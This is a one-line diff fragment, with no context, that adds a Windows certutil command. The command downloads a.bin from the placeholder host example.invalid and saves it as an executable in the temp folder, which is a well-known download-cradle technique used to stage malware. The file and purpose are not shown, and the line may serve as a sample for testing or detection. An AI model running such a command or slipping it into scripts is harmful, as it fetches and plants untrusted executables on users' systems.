@@ -1,0 +1,2 @@
+certutil -urlcache -split -f http://example.invalid/a.bin %TEMP%\a.exe
+
